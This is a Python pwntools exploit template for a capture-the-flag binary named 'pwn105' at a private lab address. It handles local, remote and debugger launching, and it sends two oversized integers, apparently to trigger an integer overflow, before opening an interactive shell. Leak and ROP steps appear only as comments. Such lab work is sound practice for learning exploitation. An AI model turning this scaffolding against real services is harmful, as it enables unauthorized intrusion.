#!/usr/bin/env python3
from pwn import *
import sys, os

# pwntools RE/exploit template
# Usage examples:
#  ./run.py                 # run locally
#  ./run.py REMOTE=1 HOST=1.2.3.4 PORT=1337  # connect to remote
#  ./run.py GDB=1           # run under gdb
#  ./run.py LIBC=./libc.so.6  # load specific libc for symbols


# ---------- CONFIG ----------
BINARY_PATH = "./pwn105-1644300421555.pwn105"           # <<-- change to target binary
HOST = os.getenv("HOST","10.49.143.32")
PORT = int(os.getenv("PORT",9005))
elf = ELF(BINARY_PATH)
context.binary=elf # change arch/endianness as needed
context.log_level='DEBUG' 


# load libc if provided on command line: LIBC=./libc.so.6
libc = ELF(args.LIBC) if args.LIBC else None

# GDB script (edit breakpoints as needed)
gdbscript = '''
run
'''.strip()

# ---------- START/CONNECT ----------
def start():
    """
    Start the process or connect to remote.
    Use command line flags:
      GDB=1      -> run under gdb
      REMOTE=1   -> connect to remote using HOST and PORT (or args.HOST/args.PORT)
    """
    if args.REMOTE:
        host = args.HOST if args.HOST else HOST
        port = int(args.PORT) if args.PORT else PORT
        return remote(host, port)
    elif args.GDB:
        return gdb.debug([BINARY_PATH], gdbscript=gdbscript)
    # import subprocess
    # subprocess.Popen(['pwndbg', BINARY_PATH])
    # return process([BINARY_PATH])
    else:
        return process([BINARY_PATH])

# ---------- HELPERS ----------
def u64_safe(x):
    x = x.ljust(8, b"\x00")
    return u64(x)

def leak_address(io, send_payload_fn, parse_fn):
    """
    Generic leak helper:
      - send_payload_fn(io) should send the leak payload and return None
      - parse_fn(io) should read from io and return the leaked integer address
    Returns the parsed integer.
    """
    send_payload_fn(io)
    return parse_fn(io)

# simple wrappers for clarity
def sl(io, data): io.sendline(data)
def s(io, data): io.send(data)
def r(io, n=4096): return io.recv(n)
def ru(io, s, drop=True): return io.recvuntil(s, drop)
def rl(io): return io.recvline()

# ---------- EXPLOIT ----------
def exploit(io):
    """
    Fill this with your exploit steps. Example leak pattern is shown.
    """
    r(io)
    sl(io,str(1 << 30))
    sl(io,str(1 << 30))
    
    
    # receive leaked address (example: reading a line that contains leaked bytes)
    # leaked = io.recvline(timeout=2)
    # log.info("Raw leak: %s", leaked)
    # parse leaked bytes into address (depends on binary output)
    # e.g., addr = u64_safe(leaked[:8])
    # log.success("Leaked puts@GLIBC: 0x{:x}".format(addr))
    
    
    
    # If libc known, compute base and find system/one_gadget
    if libc:
        # example: libc_base = leaked_puts - libc.symbols['puts']
        pass

    # final exploit (overwrite RIP, ret2system, one_gadget, ROP chain, etc.)
    # io.sendline(final_payload)
    io.interactive()

# ---------- MAIN ----------
if __name__ == "__main__":
    io = start()
    try:
        exploit(io)
    except KeyboardInterrupt:
        io.close()
        raise